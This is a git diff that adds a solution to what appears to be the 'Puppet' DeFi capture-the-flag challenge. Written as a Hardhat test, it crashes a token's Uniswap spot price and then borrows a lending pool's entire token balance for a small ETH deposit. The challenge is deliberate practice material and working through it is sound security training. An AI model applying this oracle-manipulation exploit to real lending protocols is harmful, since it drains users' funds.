@@ -103,6 +103,79 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const attackPuppet = this.lendingPool.connect(attacker);
+        const attackToken = this.token.connect(attacker);
+        const attackUniSwap = this.uniswapExchange.connect(attacker);
+
+        const logAttackerBalances = async (address, name) => {
+            const ethBal = await ethers.provider.getBalance(address);
+            const tokenBal = await attackToken.balanceOf(address);
+
+            console.log(`ETH Balance of ${name}:`, ethers.utils.formatEther(ethBal));
+            console.log(`TKN Balance of ${name}:`, ethers.utils.formatEther(tokenBal));
+            console.log("");
+        }
+
+        await logAttackerBalances(attacker.address, "attacker");
+        await logAttackerBalances(attackUniSwap.address, "Uniswap");
+
+        // Approve token to swap with UniSwap
+        console.log("Approve intiial balance");
+        await attackToken.approve(attackUniSwap.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+        console.log("Balance approved");
+
+        // Calculate ETH Pay out
+        const ethPayout = await attackUniSwap.getTokenToEthInputPrice(ATTACKER_INITIAL_TOKEN_BALANCE, 
+            {
+                gasLimit: 1e6
+            });
+
+        console.log("Transfer of 1000 tokens will net", ethers.utils.formatEther(ethPayout));
+        console.log("Transferring tokens for ETH");
+
+        await attackUniSwap.tokenToEthSwapInput(
+            ATTACKER_INITIAL_TOKEN_BALANCE,
+            ethers.utils.parseEther("9"),
+            (await ethers.provider.getBlock('latest')).timestamp * 2,
+        )
+
+        await logAttackerBalances(attacker.address, "attacker");
+        await logAttackerBalances(attackUniSwap.address, "Uniswap");
+
+        // Deposit ETH required to gain ALL tokens from the pool
+        const deposit = await attackPuppet.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log("Deposit required:", ethers.utils.formatEther(deposit));
+        await attackPuppet.borrow(POOL_INITIAL_TOKEN_BALANCE, {
+            value: deposit
+        });
+        await logAttackerBalances(attacker.address, "attacker");
+
+        const tokensToBuyBack = ATTACKER_INITIAL_TOKEN_BALANCE;
+        const ethReq = await attackUniSwap.getEthToTokenOutputPrice(tokensToBuyBack, {
+            gasLimit: 1e6
+        });
+        console.log(`ETH required for ${tokensToBuyBack} tokens:`, ethers.utils.formatEther(ethReq));
+
+        // Get our original 1000 tokens back by swapping ETH
+        await attackUniSwap.ethToTokenSwapOutput(
+            tokensToBuyBack,
+            (await ethers.provider.getBlock('latest')).timestamp * 2,
+            {
+                value: ethReq,
+                gasLimit: 1e6
+            }
+        );
+
+        console.log("*** FINISHED ***");
+        await logAttackerBalances(attacker.address, "attacker");
+        await logAttackerBalances(attackPuppet.address, "Lender")
+        await logAttackerBalances(attackUniSwap.address, "Uniswap");
+
+
+
+
+
+
     });
 
     after(async function () {
